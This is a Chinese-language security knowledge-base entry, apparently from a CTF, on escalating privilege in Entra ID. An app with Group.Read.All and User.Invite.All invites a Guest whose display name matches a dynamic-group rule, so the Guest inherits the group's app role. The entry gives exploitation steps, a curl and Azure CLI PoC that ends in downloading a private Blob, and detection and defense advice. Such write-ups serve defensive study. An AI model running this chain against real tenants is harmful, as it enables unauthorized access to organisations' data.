---
id: cloud-cloud-iam-entra-dynamic-group-guest-invite-app-role
title: Entra ID 动态组 Guest 自动入组：User.Invite.All 邀请外部账号继承组上的应用角色
type: scenario
domain: cloud
path: cloud/cloud-iam
technique: entra-dynamic-group-guest-invite-app-role
tags:
- azure
- entra-id
- cloud-iam
- dynamic-group
- guest-invite
- app-role
- privilege-escalation
- graph-api
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V167
  verified_at: '2026-11-06T09:51:34+08:00'
  notes: 已对照原文与13张图核对；修正“第三个分支”为“第二个分支”（CTF+Guest 为规则第二分支）。Graph 枚举组→appRoleAssignments→servicePrincipal→邀请 CTF 前缀 Guest→入组→az storage blob download 链与原文一致；PoC 未在本机执行
url: /docs/cloud/cloud-iam/cloud-cloud-iam-entra-dynamic-group-guest-invite-app-role/
draft: false
kb_aliases:
- Azure AD 动态组提权
- Entra 动态组成员规则滥用
- User.Invite.All 邀请 Guest
- Guest 自动入组
- DynamicMembership 规则
- appRoleAssignment 组授权
- 邀请外部账号继承应用角色
---

## 一句话结论

当一个应用在目标租户拥有 `Group.Read.All` 与 `User.Invite.All` 时，攻击者可以读取动态组的 `membershipRule`；只要规则中存在可由 Guest 身份满足的分支（如 `userType -eq "Guest"` 且 `displayName -startsWith "CTF"`），邀请一个可控外部账号即可自动成为组员，并继承该组在目标 service principal 上的 `appRoleAssignment`，最终以 Guest 身份访问受保护资源。

## 原理

- **动态组规则**：Entra ID 的动态组（`groupTypes` 含 `DynamicMembership`，`membershipRuleProcessingState=On`）由系统按 `membershipRule` 异步计算成员，不需要管理员手工加人。规则支持 `user.department`、`user.jobTitle`、`user.displayName`、`user.userType`、`user.city` 等属性。
- **布尔优先级**：本例规则为
  `(user.department -eq "Finance") and (user.jobTitle -eq "Manager") or (user.displayName -startsWith "CTF") and (user.userType -eq "Guest") or (user.city -eq "Seattle")`。
  `and` 的优先级高于 `or`，整体是三个 `or` 分支；攻击者只需满足其中任意一个分支。第二个分支只要求 Guest 且 displayName 以 `CTF` 开头，是最容易由外部账号控制的条件。
- **User.Invite.All 创建 Guest**：该应用权限允许调用 `POST /v1.0/invitations` 创建 B2B 邀请。邀请被兑换后会创建一个 `userType=Guest` 的用户实体；Guest 的显示名来自其外部账号资料（本例注册了一个显示名以 `CTF` 开头的临时邮箱微软账号），因此能命中动态组规则。
- **组上的应用角色分配**：`GET /groups/{id}/appRoleAssignments` 显示该组被分配了某个资源 service principal 的应用角色（本例 `resourceDisplayName=CTF Challenge Flag`，`appRoleId=00000000-0000-0000-0000-000000000000`）。应用角色分配给组后，组内所有成员（包括后来加入的 Guest）都继承该角色，从而获得对该资源的访问权。
- **资源地址泄露**：目标 service principal 的 `homepage` 与 `replyUrls` 直接指向受保护的 Blob 地址；`az storage blob download --auth-mode login` 使用 Guest 登录身份获取资源 token 后即可下载私有容器中的对象。存储账户本身关闭了公共访问（`PublicAccessNotPermitted`），但认证访问仍然成功。
- **为什么只需要低权限应用权限**：`Group.Read.All` 足以枚举组和组上的角色分配，`User.Invite.All` 足以制造一个新身份；两者都不需要目录全局管理员。真正的提权来自“动态组规则 + 组角色分配”的组合配置缺陷，而不是应用权限本身。

## 触发条件

- 攻击者掌握目标租户中一个已获管理员同意的应用，且该应用拥有 `Group.Read.All` 与 `User.Invite.All`（或其他可创建/修改用户的权限）。
- 目标租户存在动态组，规则允许 Guest 或可由攻击者控制的属性（displayName 前缀、department、jobTitle、city 等）命中；组的成员处理状态为 On。
- 该动态组被分配了目标资源 service principal 的应用角色（`appRoleAssignment`），且资源接受组-based 访问。
- 租户允许外部 Guest 邀请与兑换；邀请策略、条件访问或跨租户访问设置未阻止该 Guest 登录。
- 攻击者能注册/控制一个外部 Microsoft 账号，并能设置其显示名等属性以满足规则。

## 利用步骤

1. **获取应用 token**：用应用 client_id/client_secret 走 client_credentials 流程，scope 为 `https://graph.microsoft.com/.default`；解码 JWT，确认 `idtyp=app`、`tid` 为目标租户、`roles` 含 `Group.Read.All`/`User.Invite.All`。
2. **枚举动态组**：`GET /v1.0/groups?$select=displayName,id,groupTypes,membershipRule`，筛选 `groupTypes` 含 `DynamicMembership` 的组，读取 `membershipRule`；重点找包含 `userType -eq "Guest"`、`displayName -startsWith`、`department`、`jobTitle`、`city` 等可满足条件的规则。
3. **确认组上的角色**：`GET /v1.0/groups/{group-id}/appRoleAssignments`，记录 `resourceId`、`appRoleId`、`resourceDisplayName`。
4. **识别资源**：`GET /v1.0/servicePrincipals/{resourceId}`，查看 `appDisplayName`、`homepage`、`replyUrls`，确定最终可访问的数据面（本例为 Blob 容器路径）。
5. **准备外部账号**：注册一个可控的 Microsoft 账号/临时邮箱，把显示名设置为满足规则的前缀（如 `CTF...`），确保邀请兑换后 `userType=Guest` 且 `displayName` 命中规则。
6. **发起邀请**：`POST /v1.0/invitations`，提交 `invitedUserEmailAddress`、`inviteRedirectUrl`、`sendInvitationMessage=false`；响应返回 `inviteRedeemUrl` 与 `invitedUser.id`。
7. **兑换邀请**：用外部账号打开 `inviteRedeemUrl` 完成 B2B 兑换；动态组成员资格由系统异步计算，等待片刻后用 `GET /v1.0/users/{id}/memberOf` 或 `az ad user get-member-groups --id <id>` 确认已进入目标组。
8. **访问资源**：以 Guest 身份登录目标租户，获取资源 token；本例通过 `az storage blob download --account-name <account> -c <container> -n <blob> --auth-mode login` 下载私有 Blob。若资源是其他 SaaS/自定义应用，则按对应协议携带 token 访问。

## PoC

以下为按该链最小化的 Graph 请求骨架（占位符需替换；未在本机执行）：

```bash
# 1) 应用 token
TOKEN=$(curl -s -X POST "https://login.microsoftonline.com/<TENANT_ID>/oauth2/v2.0/token" \
  -d "grant_type=client_credentials" \
  -d "client_id=<CLIENT_ID>" \
  -d "client_secret=<CLIENT_SECRET>" \
  -d "scope=https://graph.microsoft.com/.default" | jq -r .access_token)

# 2) 枚举动态组与规则
curl -sH "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/groups?\$select=displayName,id,groupTypes,membershipRule" | jq .

# 3) 组上的应用角色分配
curl -sH "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/groups/<GROUP_ID>/appRoleAssignments" | jq .

# 4) 资源 service principal
curl -sH "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/servicePrincipals/<RESOURCE_ID>" | jq .

# 5) 邀请满足规则的 Guest
curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{
  "invitedUserEmailAddress": "ctf-attacker@example.com",
  "inviteRedirectUrl": "https://example.com/",
  "sendInvitationMessage": false
}' "https://graph.microsoft.com/v1.0/invitations" | jq .
```

```bash
# 6) Guest 兑换后确认组并下载私有 Blob
az ad user get-member-groups --id <GUEST_OBJECT_ID>
az storage blob download --account-name <ACCOUNT> -c <CONTAINER> -n <BLOB> -f out.bin --auth-mode login
```

## 变体与关联

- 变体：规则使用 `department`/`jobTitle`/`city` 时，若邀请方有权限更新 Guest 的这些属性，可构造匹配值；规则使用 `user.userPrincipalName -contains` 时可用可控域名命中。
- 变体：组嵌套（动态组加入另一个有权组）、组-based 许可、组上的 Azure RBAC 角色分配、组被分配多个应用角色；影响的资源可能是 Storage、Key Vault、自定义 API 或 SaaS。
- 关联：[[cloud-cloud-iam-entra-tenant-id-redirect-uri-adminconsent]]（如何获得带 `Group.Read.All`/`User.Invite.All` 的应用 token）、[[cloud-cloud-iam-aws-dangerous-permission-privesc]]（云 IAM 权限组合思路）。
- 关联防御：[[cloud-cloud-iam-workload-role-policy-selfcheck]]（工作负载权限自查）。

## 检测与防御

- **审计事件**：监控 Entra ID 审计日志中的 `Invite external user`、`Add member to group`、`Add app role assignment grant to group`、`Update group`（动态规则变更）；关注新 Guest 在邀请后短时间内加入高权限组。
- **规则审查**：定期导出所有 `DynamicMembership` 组的 `membershipRule`，标记包含 `userType -eq "Guest"`、宽泛 `displayName -startsWith`、`-contains`、单一 `or` 分支即可命中的规则；对高权限组禁止 Guest 自动入组。
- **权限最小化**：从应用中移除不必要的 `User.Invite.All`、`Group.Read.All`；限制谁能创建 Guest；对 Guest 邀请启用审批/访问评审。
- **角色分配审查**：检查所有组上的 `appRoleAssignments`，尤其是把应用角色分配给包含 Guest 或宽泛动态规则的组；改为直接分配给具体用户/受控组。
- **资源侧**：不要把敏感 URL 放在 service principal 的 `homepage`/`replyUrls`；对 Blob/Storage 使用最小 RBAC、私有终结点与条件访问；对 Guest 访问启用 MFA/合规设备要求。
- **检测查询思路**：同一应用在短时间内枚举大量组 → 读取 `appRoleAssignments` → 创建邀请 → 新 Guest 加入组 → 该 Guest 访问资源，形成高风险序列。
